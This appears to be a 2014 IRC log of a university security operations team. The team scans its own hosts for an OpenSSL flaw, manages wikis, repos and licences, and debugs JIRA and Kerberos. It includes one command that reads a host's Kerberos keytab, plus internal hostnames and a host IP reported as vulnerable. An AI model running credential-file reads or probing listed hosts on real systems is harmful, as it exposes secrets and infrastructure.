2014-06-06 01:55:00	-->	soehlert (soehlert@hidden-EF13FB3B.hsd1.il.comcast.net) has joined #security
2014-06-06 01:55:00	--	Channel #security: 5 nicks (0 ops, 0 halfops, 0 voices, 5 normals)
2014-06-06 01:55:12	--	Mode #security [+]
2014-06-06 01:55:12	--	Channel created on Tue, 04 Feb 2014 20:39:53
2014-06-06 07:32:43	jazoff	openssl stuff finally showed up on https://www.suse.com/support/update/
2014-06-06 07:32:47	jazoff	updating the wiki
2014-06-06 09:40:58	soehlert	jazoff: didnt you say that debian based systems called the package libssl?
2014-06-06 09:46:28	jazoff	yeah
2014-06-06 09:46:38	soehlert	the wiki page says "openssl"
2014-06-06 09:47:01	jazoff	openssl is the tool
2014-06-06 09:47:14	jazoff	/usr/bin/openssl and stuff
2014-06-06 09:47:41	soehlert	ok i thought that was supposed to be the package name in the commands
2014-06-06 09:47:41	soehlert	or at least the first one.
2014-06-06 09:47:46	soehlert	apt-cache rdepends openssl
2014-06-06 09:47:53	jazoff	libssl1.0.0
2014-06-06 09:47:55	jazoff	is the package
2014-06-06 09:48:19	soehlert	well right just making sure we have the right command. if it's not supposed to be the package name in that command then were all good
2014-06-06 09:49:19	jazoff	do a dpkg -l | grep ssl
2014-06-06 09:49:24	jazoff	or even
2014-06-06 09:49:41	soehlert	i dont have a debian system. just making sure we had the right command. i believe you
2014-06-06 09:49:47	jazoff	ah
2014-06-06 09:50:09	jazoff	there's also libssl0.9.8
2014-06-06 09:54:46	soehlert	jazoff: did you see the bro policies bernhard wrote for this openssl? are we runnin those?
2014-06-06 09:55:30	jazoff	yeah
2014-06-06 09:55:42	soehlert	sweet
2014-06-06 10:01:01	jazoff	first thing this morning
2014-06-06 10:01:30	soehlert	figured you were on top of that.
2014-06-06 11:30:41	soehlert	gahhhh stupid moin this is pissin me off..
2014-06-06 11:33:39	jazoff	what's up?
2014-06-06 11:47:11	soehlert	idk i just cant get it to work and all the how to's i see are old.
2014-06-06 11:47:33	soehlert	if you go to wiki-sec via http you see that apache is working ok, but i cant figure out how to get it to point to my wiki instance
2014-06-06 11:50:10	jazoff	http://moinmo.in/HowTo/ApacheWithModWSGI
2014-06-06 11:50:46	soehlert	ah another new one. ill try this howto. this is about the 10th moin with apache howto on their website and theyre all different...sigh thansk
2014-06-06 11:50:48	jazoff	so, minimally, WSGIScriptAlias / /usr/share/moin/server/moin.wsgi
2014-06-06 11:52:56	soehlert	where? in httpd.conf? the one installed is different so im not sure if thats what they're talking about
2014-06-06 11:53:12	jazoff	i'd so something in puppet similar to what I do for the portal
2014-06-06 11:53:24	soehlert	ok i'll take a look at that
2014-06-06 11:55:24	jazoff	or at least just look at the config file puppet generated for the portal on portal-sec
2014-06-06 11:55:29	jazoff	since that is kinda what you need
2014-06-06 11:57:28	soehlert	class portal::config?
2014-06-06 11:59:30	jazoff	yeah, the apache::vhost
2014-06-06 11:59:41	soehlert	ok will play with that after lunch
2014-06-06 13:59:24	soehlert	progress...if you go to wiki-sec you see the wiki files..
2014-06-06 14:10:57	soehlert	jazoff: what are you doing on fog thats using so much memory?
2014-06-06 14:12:14	soehlert	oh some dumbno stuff..
2014-06-06 14:24:32	soehlert	gotta take the dogs to the vet. lemme know if anyone needs anything. otherwise, have a good weekend.
2014-06-06 14:33:36	jazoff	hmm
2014-06-06 14:33:57	jazoff	ah, my arista stats program.. wonder if it leaks mem when you leave it running for weeks
2014-06-09 07:53:07	<--	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has quit (Quit: Leaving.)
2014-06-09 08:27:31	-->	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has joined #security
2014-06-09 08:50:32	jazoff	wardog: all set for coming in jun 15-21
2014-06-09 09:10:32	wardog	cool
2014-06-09 09:10:54	wardog	Ah, so next week.
2014-06-09 09:11:03	wardog	Must have found a good deal
2014-06-09 09:14:59	jazoff	yeah.. wasn't bad with the state rate
2014-06-09 09:15:10	jazoff	problem is I didn't know about the state rate the last few tiems :)
2014-06-09 09:15:20	jazoff	not sure if I can get a refund/credit for those trips 
2014-06-09 09:16:02	wardog	Sounds like it's a lot cheaper.
2014-06-09 09:16:25	jazoff	yeah... something like 8ish a night instead of 150ish
2014-06-09 09:16:28	jazoff	er, 80ish
2014-06-09 09:16:42	jazoff	so, * 6 it comes out considerable cheaper
2014-06-09 10:05:52	wardog	jazoff: what were the total number of IP blocks from Q1?
2014-06-09 10:06:06	jazoff	hmm
2014-06-09 10:06:20	jazoff	from bro or total?
2014-06-09 10:07:01	wardog	bro
2014-06-09 10:07:05	jazoff	damn, don't have irssi logs enabled
2014-06-09 10:07:18	jazoff	ah, from bro I can grab it from the notice logs easy enough
2014-06-09 10:12:20	jazoff	615377 block notices...
2014-06-09 10:12:29	jazoff	unique....
2014-06-09 10:12:44	jazoff	227177
2014-06-09 10:20:35	jazoff	wardog: was there a scanner for the latest ssl issue?
2014-06-09 10:20:43	jazoff	heard something about an offline version of that redhat site
2014-06-09 10:25:20	wardog	Yes.
2014-06-09 10:25:32	wardog	I tried to email it and the email scanner ripped it out... 
2014-06-09 10:25:34	wardog	It was in perl.
2014-06-09 10:25:37	wardog	And then I got sidetracked.
2014-06-09 10:25:46	jazoff	ah
2014-06-09 10:25:59	jazoff	can you just copy it to /tmp/ on fog
2014-06-09 10:27:00	wardog	done
2014-06-09 10:35:59	jazoff	grabbed one ip at random from the ssl.txt i had lying around
2014-06-09 10:36:06	jazoff	141.142.234.76  443
2014-06-09 10:36:07	jazoff	FAIL Remote host is affected
2014-06-09 10:42:59	jazoff	scanning todays ssl hosts
2014-06-09 10:44:51	wardog	Want to set up something similar to the heartbleed check?
2014-06-09 10:45:40	jazoff	yeah
2014-06-09 10:51:59	jazoff	https://cyclone.ncsa.illinois.edu:8000/en-US/app/search/CCS
2014-06-09 10:58:54	wardog	"Unable to get viewstate information; formatting may not be correct"
2014-06-09 10:59:49	jazoff	try relaod?
2014-06-09 10:59:53	jazoff	think i may have been editing it
2014-06-09 11:00:01	wardog	still
2014-06-09 11:00:28	jazoff	it doesn't load at all?
2014-06-09 11:01:12	wardog	Oh, the page loads, I just get that error at the top
2014-06-09 11:04:36	jazoff	so, lots of vulnerable hosts
2014-06-09 11:04:42	jazoff	at least according to the perl script
2014-06-09 11:04:51	wardog	yep
2014-06-09 11:04:52	jazoff	a little harder to verify than heartbleed, that was kind of obvious
2014-06-09 11:26:35	jazoff	so.. that's a lot of unpatched hosts
2014-06-09 11:27:10	wardog	Assuming teh check is correct
2014-06-09 11:27:38	wardog	Need a lookup table that associates the appropriate contact for those IPs...
2014-06-09 11:27:54	jazoff	where would one get the data for that?
2014-06-09 11:28:06	wardog	A mix.
2014-06-09 11:28:11	wardog	dnsworks for 1
2014-06-09 11:28:19	wardog	not 100% reliable, but it's a starting point.
2014-06-09 11:28:22	soehlert	aka we dont have a good setup..
2014-06-09 11:28:37	wardog	doug for 2. His group would just track it down.
2014-06-09 11:28:48	wardog	Logs for 3.
2014-06-09 11:29:01	wardog	Hope to find a regular user in logs.
2014-06-09 11:29:06	wardog	Maybe a 'to' address for root emails.
2014-06-09 11:43:46	jazoff	that's an interesting idea
2014-06-09 12:47:26	jazoff	gah, forgot to eat again
2014-06-09 12:47:49	jazoff	everytime I do a ton of stuff remotely vs locally I end up looking at CDT timestamps too much
2014-06-09 13:11:49	wardog	WarGames, 2FA edition: https://www.youtube.com/watch?v=WH_KuCCf0c0
2014-06-09 13:12:18	soehlert	hah ya was watching that earlier. pretty great
2014-06-09 13:48:40	jazoff	i think at educause I went to a 2fa presentation..
2014-06-09 13:49:04	jazoff	during the rollout at the school someone complained that the stupid thing kept waking them up in the middle of the night to verify the authentications
2014-06-09 13:49:14	jazoff	the persons account was compromised and they had been approving the login requests
2014-06-09 13:49:54	wardog	lulz
2014-06-09 14:20:22	soehlert	imagine being the hacker and realizing it's got 2FA, and then the sheer incredulity of it actually being accepted..
2014-06-09 14:38:11	soehlert	jazoff: adam is trying to catch you on jabber
2014-06-09 14:39:05	jazoff	hmm
2014-06-09 14:39:38	soehlert	hes tellin me on jabber to get your attention..
2014-06-09 14:39:47	jazoff	weird, I was signed on..
2014-06-09 14:40:03	wardog	ncsa or cites?
2014-06-09 14:40:11	wardog	guess he's on both
2014-06-10 09:06:29	jazoff	so.. 201 vulnerable hosts according to that perl script
2014-06-10 09:12:59	eyrich	vulnerable to what?
2014-06-10 09:14:52	wardog	CCS
2014-06-10 09:18:15	jazoff	https://cyclone.ncsa.illinois.edu:8000/en-US/app/search/CCS
2014-06-10 09:41:50	jazoff	http://www.redhat.com/about/news/press-archive/2014/6/red-hat-unveils-rhel-7
2014-06-10 09:45:54	wardog	Basically Fedora 20
2014-06-10 09:47:44	jazoff	systemd ftw
2014-06-10 14:18:43	jazoff	dumbno working amazing today.. really think those ssl issues were the cause of things getting 'missed'
2014-06-10 15:11:59	soehlert	jazoff: is this how i would set up a new repo on gitsec? the first part anyways..http://git-scm.com/book/en/Git-Basics-Getting-a-Git-Repository
2014-06-10 15:43:19	jazoff	oh no... you do it through the web interface
2014-06-10 15:43:56	jazoff	https://git-sec.internal.ncsa.edu/projects/new
2014-06-10 15:44:49	soehlert	I should make it public if I want all of us to have access yes?
2014-06-10 15:45:21	jazoff	no..
2014-06-10 15:45:34	soehlert	ah ok
2014-06-10 15:46:03	jazoff	change namespace to ncsa security
2014-06-10 15:47:09	soehlert	how do i do that?
2014-06-10 15:50:38	jazoff	the dropdown on that page
2014-06-10 15:51:04	soehlert	ah didnt see the dangerous settings
2014-06-10 15:51:20	soehlert	i dont see any options but me though.
2014-06-10 15:52:05	jazoff	on https://git-sec.internal.ncsa.edu/projects/new ?
2014-06-10 15:53:15	soehlert	no i had already created it. i saw that option on the settings page. i deleted it to start again though and on that link you give me there are only: Project name is Description and a checkbox for Public project
2014-06-10 15:53:23	soehlert	i can create a group as well or cuztomize repo name
2014-06-10 15:53:30	soehlert	thats it
2014-06-10 15:53:30	soehlert	nothing about namespace
2014-06-10 15:54:32	jazoff	weird
2014-06-10 15:54:43	soehlert	do you have more access i dont or something?
2014-06-10 15:55:07	jazoff	hmm are you on that page or trying to edit an existing repo?
2014-06-10 15:55:40	soehlert	im on your page
2014-06-10 15:55:44	soehlert	the projects/new
2014-06-10 15:56:02	soehlert	on the settings page i had the option to change namespace, but only choice was me. and i deleted that to start over
2014-06-10 15:56:49	jazoff	try now
2014-06-10 15:56:52	jazoff	you were in there as a 'developer'
2014-06-10 15:56:55	jazoff	i made you an 'owner'
2014-06-10 15:57:18	soehlert	aha that did it
2014-06-10 16:25:10	soehlert	added two new repos. one for incident reports and one for random secops stuff. basically there's no need for a secops wiki this way and it seems easier to do, one less host to manage etc.
2014-06-10 16:36:33	jazoff	works for me
2014-06-11 07:57:58	jazoff	keist: munin is saying /tmp on nagios-sec is low on space
2014-06-11 10:22:17	keist	jazoff: kk, will look into it
2014-06-11 11:10:26	jazoff	looks like qualys scan is triggering the bro CCS notice
2014-06-11 11:10:51	jazoff	not sure if they are checking for CCS or just happen to trigger the notice
2014-06-11 11:12:21	eyrich	can someone tell me what a dev cluster node reports the ethernet controller is on the 10Gb card
2014-06-11 11:13:59	jazoff	41:00.0 Ethernet controller: Intel Corporation Ethernet 10G 2P X520 Adapter (rev 01)
2014-06-11 11:18:35	eyrich	ok, thanks
2014-06-11 11:18:48	eyrich	i was hoping to see something like: Intel 82599ES 10 Gigabit Ethernet Controller
2014-06-11 11:18:55	eyrich	instead of the card information
2014-06-11 11:19:30	jazoff	they are interchangable...
2014-06-11 11:19:55	jazoff	intel is annoying like that
2014-06-11 11:23:51	jazoff	at least, mostly interchangable
2014-06-11 11:23:57	eyrich	right
2014-06-11 11:23:59	jazoff	i don't think the card knows which kind it is
2014-06-11 11:24:27	eyrich	there is abunch of cards that meet the descripton of dual port x520
2014-06-11 11:24:34	jazoff	X520-DA2
2014-06-11 11:24:38	jazoff	i think is the one we have
2014-06-11 11:24:50	eyrich	agreed
2014-06-11 11:24:51	jazoff	they just differ by the connector 
2014-06-11 11:24:57	eyrich	yes
2014-06-11 11:25:06	soehlert	Intel(R) 10 Gigabit PCI Express Network Driver - version 3.21.2
2014-06-11 11:25:06	soehlert	does that help?
2014-06-11 11:25:25	jazoff	no
2014-06-11 11:25:34	eyrich	what jazoff sent me worked 
2014-06-11 11:25:51	eyrich	thanks i needed to confirm so I could find a CDWG part # for adam
2014-06-11 11:26:16	jazoff	i did learn recently that 2 single port cards are potentially better than 1 dual port card
2014-06-11 11:26:34	soehlert	better in what way?
2014-06-11 11:26:36	jazoff	it's related to cpu pinning and numa
2014-06-11 11:26:58	jazoff	a dual port card can only talk directly to one cpu, so half the traffic has to be sent over to the other cpu
2014-06-11 11:27:08	soehlert	ahh
2014-06-11 11:27:18	jazoff	though as far as I know this only decreases performance 1%
2014-06-11 13:27:19	<--	wardog (wraquel@hidden-EA35C84E.ncsa.illinois.edu) has quit (Ping timeout)
2014-06-11 14:17:18	jazoff	eyrich: is veeam backing up portal-sec?
2014-06-11 14:38:18	eyrich	jazoff: no
2014-06-11 14:38:38	jazoff	can it? :)
2014-06-11 14:38:54	eyrich	sure
2014-06-11 14:40:00	eyrich	it will 1st run 4am tomorrow
2014-06-11 14:40:05	jazoff	great
2014-06-11 15:47:58	-->	wraquel (wraquel@hidden-EA35C84E.ncsa.illinois.edu) has joined #security
2014-06-11 15:48:52	wraquel	Was haboob restarted?
2014-06-12 07:19:27	eyrich	yes
2014-06-12 07:19:43	eyrich	wraquel: yes - also you should install vmware tools
2014-06-12 09:13:12	wraquel	I thought I had it installed...
2014-06-12 09:16:31	eyrich	you might have to update or restart after a kernel update
2014-06-12 09:17:45	eyrich	vmware reports not running (not installed)
2014-06-12 09:33:15	<--	wraquel (wraquel@hidden-EA35C84E.ncsa.illinois.edu) has quit (Quit: oops wrong, button.)
2014-06-12 09:34:04	-->	wraquel (wraquel@hidden-EA35C84E.ncsa.illinois.edu) has joined #security
2014-06-12 09:57:47	soehlert	wraquel: we used haboob to figure out how we're going to upgrade, secure, and clean up our non production esx stuff. Yours was the only vm on haboob that was even possibly being used, but we figured since you were out it wouldn't impact you much.
2014-06-12 09:59:56	wraquel	It didn't. Just wondering why the vm restarted. I figured haboob was restarted.
2014-06-12 10:00:10	soehlert	ok good
2014-06-12 10:00:13	wraquel	I also just installed vmware tools
2014-06-12 10:00:28	wraquel	are there food plans today?
2014-06-12 10:00:38	wraquel	I once again did not bring food
2014-06-12 10:00:44	soehlert	no plans but ill need to get something
2014-06-12 10:34:18	wraquel	Anyone up for gumbo?
2014-06-12 10:34:36	jazoff	do they deliver?
2014-06-12 10:34:44	soehlert	lulz
2014-06-12 10:35:07	wraquel	SC14 is in New Orleans this year.
2014-06-12 10:35:16	eyrich	ya, ill go
2014-06-12 10:35:26	wraquel	when do you want to head.
2014-06-12 10:37:47	soehlert	later the better in my book..
2014-06-12 10:53:15	wraquel	12:30?
2014-06-12 10:53:24	soehlert	works for me
2014-06-12 10:57:13	eyrich	i can do that, 
2014-06-12 11:49:30	soehlert	jazoff: can you whitelist all your sudo's on these new bro boxes you guys have so we don't get so many alerts?
2014-06-12 11:50:43	jazoff	yeah.. is that integrated in the portal now?
2014-06-12 11:51:15	soehlert	it must be because my script on analysis-sec works via the portal api right?
2014-06-12 11:51:21	jazoff	yeah
2014-06-12 11:53:03	jazoff	added
2014-06-12 11:53:10	soehlert	danke
2014-06-12 12:24:13	keist	jesus, golub001 sent us 8m+ logs in an hour last night. lots of memory errors
2014-06-12 12:24:31	soehlert	ya they're having some major issues on ICC
2014-06-12 12:24:52	wraquel	gpfs issues. Must be doing the filesystem check
2014-06-12 12:25:26	wraquel	lets eat
2014-06-12 12:25:33	soehlert	k
2014-06-13 01:54:48	--	irc: disconnected from server
2014-06-13 01:54:58	-->	soehlert (soehlert@hidden-EF13FB3B.hsd1.il.comcast.net) has joined #security
2014-06-13 01:54:58	--	Channel #security: 5 nicks (0 ops, 0 halfops, 0 voices, 5 normals)
2014-06-13 01:55:10	--	Mode #security [+]
2014-06-13 01:55:10	--	Channel created on Tue, 04 Feb 2014 20:39:53
2014-06-13 09:45:48	soehlert	just a heads up warren's lettin me work from home once a week to focus on sans/python classwork. so i'm around, but not focusing on regular work stuff today.
2014-06-13 09:46:17	soehlert	that being said, keist, new kickstart server is up and running as a centos box. feel free to do your testing now.
2014-06-13 10:28:12	keist	kk
2014-06-13 15:05:26	<--	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has quit (Quit: Leaving.)
2014-06-15 13:39:28	soehlert	keist: i figured out your issues, forgot to update some things on the new kickstart server. should hopefully be good now.
2014-06-16 07:16:11	-->	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has joined #security
2014-06-16 13:45:58	keist	70% chance of rain on Thursday, try volleyball? Tomorrow looks like the least likely to rain for hte week
2014-06-16 14:00:15	soehlert	can't play tomorrow
2014-06-16 14:02:00	wraquel	try
2014-06-16 14:02:02	wraquel	thurs
2014-06-16 14:02:31	soehlert	wraquel: check your IM
2014-06-16 14:10:10	eyrich	 91.21.220.65
2014-06-16 14:10:15	jazoff	ncsabot: traffic to 91.21.220.65
2014-06-16 14:10:45	-->	ncsabot (nodebot@hidden-1B126FE6.internal.ncsa.edu) has joined #security
2014-06-16 14:10:47	jazoff	ncsabot: traffic to 91.21.220.65
2014-06-16 14:10:54	ncsabot	Seen in 0 hours over 0 days. First seen in . Last seen in 
2014-06-16 15:31:07	eyrich	ncsabot: traffic to 41.190.4.20
2014-06-16 15:31:13	ncsabot	Seen in 9 hours over 5 days. First seen in 2013-11-13.db. Last seen in 2014-06-10.db
2014-06-16 16:03:18	keist	going to head home, will work from there for a bit
2014-06-18 10:32:02	eyrich	jon: see the bottom of this page
2014-06-18 10:32:04	eyrich	https://wiki.ncsa.illinois.edu/display/CSD/Sec-Ops+Vmware+ESX+-+Production
2014-06-18 10:32:12	eyrich	 I mean keist
2014-06-18 13:06:19	keist	kk
2014-06-18 15:40:59	wraquel	go.teragrid can be blown away
2014-06-19 09:53:45	soehlert	wraquel: cool
2014-06-19 14:28:45	wraquel	soehlert: how many RHEL licenses do you need?
2014-06-19 14:32:39	soehlert	4 i guess. bwbh1/2, cerberus0/4
2014-06-19 14:34:47	wraquel	k
2014-06-19 14:56:37	<--	ncsabot (nodebot@hidden-1B126FE6.internal.ncsa.edu) has quit (Input/output error)
2014-06-19 15:00:07	soehlert	holy hell nagios IRC...
2014-06-19 15:00:47	wraquel	yeah...
2014-06-19 15:00:50	wraquel	That's a little noisy
2014-06-19 15:01:43	keist	KCCO
2014-06-19 15:16:43	wraquel	Weird
2014-06-19 15:16:54	wraquel	unaccounted sudo email about the ACEAGENT rsa errors.
2014-06-19 15:17:01	wraquel	What's up with that?
2014-06-19 15:42:53	soehlert	wraquel: not sure. that's mashing up two alerts..
2014-06-19 15:43:11	soehlert	unless unaccounted sudo is rreading the ossec logs...
2014-06-20 09:15:23	eyrich	or email logs?
2014-06-20 11:53:11	<--	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has quit (Quit: Leaving.)
2014-06-23 08:19:19	-->	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has joined #security
2014-06-23 09:57:05	wraquel	Nice of Rolando to finally show up in the last 30 seconds of the game yesterday.... sigh.
2014-06-23 09:57:22	soehlert	Ronaldo :)
2014-06-23 09:57:22	soehlert	but ya...boo
2014-06-23 09:57:38	wraquel	I know. I'm mocking.
2014-06-23 09:57:47	soehlert	aha! i get jokes..
2014-06-23 09:58:02	wraquel	At least it wasn't worse.
2014-06-23 09:58:30	soehlert	Absolutely. If you told me before the cup we'd get 4 pts from the first two I"d be ecstatic
2014-06-23 09:58:58	wraquel	You mean, 'not ghana happen'?
2014-06-23 09:59:07	soehlert	heyyoo
2014-06-23 10:03:52	wraquel	That Korea v Algeria game was crazy
2014-06-23 10:04:11	soehlert	ya who knew algeria had it in them. and korea kept making you think it was still on
2014-06-23 10:20:02	jazoff	something something sportsball something
2014-06-23 11:03:40	wraquel	The RHEL license guy is not very responsive...
2014-06-23 11:04:06	soehlert	well thats great
2014-06-23 11:04:45	wraquel	I sent a follow-up today on status.
2014-06-23 12:58:08	wraquel	Yay, the undergrad finally has blu-ray media. It's a small collection but it's a start.
2014-06-23 13:00:08	jazoff	hmm, lync and mail seem to be broken
2014-06-23 13:00:28	jazoff	ah, lync reconnected at least
2014-06-23 14:04:13	wraquel	Anyone know if the majordomo mail list server uses any kind of spam control?
2014-06-23 14:05:19	soehlert	i dont think so
2014-06-23 14:05:40	soehlert	hence all of our spanish friends emailing us non stop :)
2014-06-23 14:49:01	jazoff	[jazoff@fog ~]$ ssh nagios-sec
2014-06-23 14:49:02	jazoff	ssh: connect to host nagios-sec port 22: Connection refused
2014-06-23 14:49:03	jazoff	huh?
2014-06-23 14:49:30	jazoff	oh, internal
2014-06-23 15:22:13	soehlert	keist: i gotta shut down the kickstart server..are you using it at the moment?
2014-06-23 15:23:27	jazoff	i think he might be driving back now
2014-06-23 15:23:39	soehlert	that seems like a no then..
2014-06-24 09:50:54	wraquel	So, weird, got a renewal quote from PuppetLabs for Puppet Enterprise.
2014-06-24 09:51:12	wraquel	I'm pretty sure (from checking email) this was taken care of in April.
2014-06-24 09:56:30	soehlert	ya...
2014-06-24 09:57:51	wraquel	Was that updated on the puppet server?
2014-06-24 09:58:15	wraquel	Jeez... where did the time go?
2014-06-24 09:58:48	soehlert	i dont...remember
2014-06-24 10:01:12	soehlert	is there an attachment to that email?
2014-06-24 10:01:25	soehlert	or any with a license file?
2014-06-24 10:04:26	wraquel	I know that the server info shows the license dates
2014-06-24 10:04:34	wraquel	I just don't know where.
2014-06-24 10:04:37	wraquel	Or forget
2014-06-24 10:04:39	soehlert	right and i need to put the new one in..
2014-06-24 10:04:56	wraquel	ah.... I don't recall.
2014-06-24 10:05:07	soehlert	well im asking because i didnt get any of the emails
2014-06-24 10:07:18	soehlert	ya the last thing i have is the quote
2014-06-24 10:07:23	wraquel	effing purchasing.
2014-06-24 10:07:30	wraquel	They JUST NOW signed the PO.
2014-06-24 10:07:42	wraquel	3 days from expiration.
2014-06-24 10:07:55	wraquel	I asked puppet labs how fast they can turn this PO around.
2014-06-24 10:08:42	soehlert	oh damn that could be a problem.
2014-06-24 10:13:52	soehlert	jazoff: bwbh_user_check just failed strangely
2014-06-24 10:20:59	wraquel	Puppet guy said it'll be done today.
2014-06-24 10:21:08	wraquel	Sorry, *should* be done today.
2014-06-24 10:21:09	soehlert	phew yay puppet
2014-06-24 10:32:51	wraquel	boom goes the power line...
2014-06-24 10:35:49	jazoff	soehlert: oh?
2014-06-24 10:36:09	soehlert	ya there were no errors, it just didnt do anything
2014-06-24 10:36:25	jazoff	did it not find the jira ticket?
2014-06-24 10:36:27	soehlert	no comments, no removal, no reassigning
2014-06-24 10:36:27	soehlert	it showed me the users not on all hosts and that was that
2014-06-24 10:36:33	soehlert	oh maybe thats why
2014-06-24 10:36:35	wraquel	Uh...
2014-06-24 10:36:38	jazoff	most likely, yeah
2014-06-24 10:36:42	soehlert	i forget if it actually says theres a ticket or not
2014-06-24 10:36:44	wraquel	forwarded you the licesnse stuff
2014-06-24 10:36:45	jazoff	was that ticket assigned/titled differently?
2014-06-24 10:36:51	wraquel	It looks.... weir.
2014-06-24 10:36:52	wraquel	d
2014-06-24 10:36:59	soehlert	Account Removal (Michael Kuhlen)
2014-06-24 10:36:59	soehlert	assigned to security list
2014-06-24 10:37:12	soehlert	wraquel: whys it look weird?
2014-06-24 10:37:15	jazoff	try the query that is in the code manually
2014-06-24 10:37:24	wraquel	Seems, simplistic.
2014-06-24 10:37:42	wraquel	Can't we just change that date to something arbitrary or does the puppet server call home?
2014-06-24 10:37:46	jazoff	project=BWAM AND summary ~ "Account+Removal" AND status = "in progress" AND assignee != "melliott"
2014-06-24 10:38:17	soehlert	hmm ya nothing matched
2014-06-24 10:38:41	soehlert	ahhh the status is "open"
2014-06-24 10:39:13	soehlert	nope changing that it still doesn't find it
2014-06-24 10:40:07	wraquel	huh... the current license key is just like that.
2014-06-24 10:40:13	wraquel	odd.
2014-06-24 10:40:24	soehlert	wait wraquel are you talking about different thi9ngs
2014-06-24 10:40:24	soehlert	im getting confused..
2014-06-24 10:40:43	wraquel	the puppet license. Sent you an email about it. The key looks too simple.
2014-06-24 10:40:48	wraquel	But that's what it is...
2014-06-24 10:40:57	wraquel	Just need to update it on squall.
2014-06-24 10:41:01	soehlert	ah
2014-06-24 10:41:01	soehlert	ya
2014-06-24 10:46:51	wraquel	new jira.... so confusing...
2014-06-24 10:47:07	wraquel	That search brings up BWAM-2354
2014-06-24 10:47:24	soehlert	what? i got nothing on my search
2014-06-24 10:47:24	soehlert	what exactly did you search?
2014-06-24 10:47:52	wraquel	that ticket is old.
2014-06-24 10:48:04	wraquel	https://jira.ncsa.illinois.edu/browse/BWAM-2354?jql=project%3DBWAM%20AND%20summary%20~%20%22Account%2BRemoval%22%20AND%0A%20%20%20%20%20%20%20%20%20%20status%20%3D%20%22in%20progress%22%20AND%20assignee%20!%3D%20%22melliott%22
2014-06-24 10:49:00	soehlert	right, but i mean how did you get a response and i didnt
2014-06-24 10:49:14	wraquel	Could be permissions.
2014-06-24 10:49:32	wraquel	Private Ticket (Tickets that only the team plus reporter can see)
2014-06-24 10:49:36	soehlert	thats what im afraid of since i assume our bot will have similar permissions to me
2014-06-24 10:49:51	soehlert	havent they always been private tickets?
2014-06-24 10:50:03	soehlert	and isnt our bot on the security list?
2014-06-24 10:50:12	wraquel	I dunno. Are you able to open that specific ticket?
2014-06-24 10:50:20	soehlert	i mean i can look at it on the web
2014-06-24 10:50:27	soehlert	i cant find it in a search and neither can our bot
2014-06-24 10:50:37	wraquel	ah
2014-06-24 10:51:16	wraquel	maybe a conversion issue on the search terms.
2014-06-24 10:51:23	soehlert	?
2014-06-24 12:04:22	wraquel	Huh... SSH kept my session open on fog after my laptop was asleep for over an hour.
2014-06-24 12:10:30	jazoff	the one search found it before..
2014-06-24 12:10:31	jazoff	10:09 < ncsabot> JIRA opened Ticket BWAM-2473 Account Removal (Michael Kuhlen) https://jira.ncsa.illinois.edu/browse/BWAM-2473
2014-06-24 12:10:53	jazoff	but that does assignee in (membersOf("org_irst"), security, secops_bot) and status!=Closed
2014-06-24 12:26:53	soehlert	ahh i was wondering how the bot managed to post it in the first place. got sidetracked and forgot to run that down..
2014-06-24 12:30:29	jazoff	did you end up figuring it out or just doing it manually?
2014-06-24 12:30:51	soehlert	just did it manually for now. if it causes more problems in the future (and i have more time) i'll look into it more.
2014-06-24 12:31:04	jazoff	ok
2014-06-24 12:31:09	jazoff	was jira upgraded or something recently?
2014-06-24 12:31:16	jazoff	i mean.. the script didn't change
2014-06-24 12:31:27	soehlert	it does look different. i wonder if the API changed or something?
2014-06-24 12:31:50	jazoff	the irc script thing worked...
2014-06-24 12:32:08	soehlert	oh right..hmm idk maybe they changed the names of some fields or something?
2014-06-24 12:32:24	jazoff	yeah, that sounds likely
2014-06-24 12:34:34	wraquel	yes, it was upgraded
2014-06-24 12:34:40	wraquel	IT's at 6.2 now
2014-06-24 12:41:18	jazoff	well, next time a ticket is created and isn't found we can figure out it
2014-06-24 12:41:45	soehlert	yup
2014-06-24 12:42:00	jazoff	since it's just project, summary, status, assignee it should be easy to figure out which filter isn't matching
2014-06-24 12:42:09	jazoff	my vote's on status
2014-06-24 12:42:23	soehlert	that was my initial guess too for some reason
2014-06-24 12:43:10	jazoff	well it's the one that isn't really user defined
2014-06-24 12:43:25	jazoff	project shouldn't change, summary we enter, and assignee is the username which should be the same
2014-06-24 12:52:01	jazoff	ah, forgot to each lunch
2014-06-24 13:10:23	soehlert	ugh i cannot figure out how to get kerberos auth working on the new kickstart host. checked the time, all libs seem to be there, pam seems correct, sshd_config matches working hosts...any ideas?
2014-06-24 13:10:33	soehlert	if anyone wants to poke around secops user is working
2014-06-24 13:12:29	wraquel	routing to kerberos server?
2014-06-24 13:15:53	soehlert	pings fine.
2014-06-24 13:19:04	wraquel	tcp to needed port?
2014-06-24 13:19:13	soehlert	should i be able to telnet?
2014-06-24 13:19:26	wraquel	what's the system?
2014-06-24 13:19:38	soehlert	kerberos.ncsa.uiuc.edu
2014-06-24 13:19:40	soehlert	port 88
2014-06-24 13:19:47	wraquel	I mean the kickstart system
2014-06-24 13:19:58	wraquel	is it dual homed?
2014-06-24 13:20:03	soehlert	kickstart-sec
2014-06-24 13:20:03	soehlert	you can get on as secops password in lastpass
2014-06-24 13:20:07	soehlert	yes
2014-06-24 13:31:33	wraquel	I wonder if it's messing up on teh hostname.
2014-06-24 13:33:08	soehlert	thats what i was just wondering. trying it out as ncsa.illinois.edu instead of internal. (though i think i ktadded internal..)
2014-06-24 13:35:58	jazoff	you did
2014-06-24 13:36:14	jazoff	sudo strings /etc/krb5.keytab
2014-06-24 13:36:25	soehlert	ya i checked too
2014-06-24 13:37:21	soehlert	welp that was the issue..
2014-06-24 13:37:33	soehlert	not sure why, but it didnt like the internal one.
2014-06-24 13:38:09	soehlert	is there actually a reason that wouldn't work? is there some domain setting on the kerberos server or something?
2014-06-24 13:38:17	jazoff	debug1: Unspecified GSS failure.  Minor code may provide more information
2014-06-24 13:38:19	jazoff	Wrong principal in request
2014-06-24 13:38:35	soehlert	kinit again
2014-06-24 13:39:09	jazoff	oh, now it works
2014-06-24 13:39:26	soehlert	ya not totally sure why you need to kinit again, but it seems to work..
2014-06-24 14:37:15	wraquel	before kerb will attempt to connect to the kerberos server it checks for an existing keytab for the host. If it does't find one it fails
2014-06-24 14:38:49	wraquel	brOS, bro operating system
2014-06-24 14:38:58	soehlert	is that a thing?
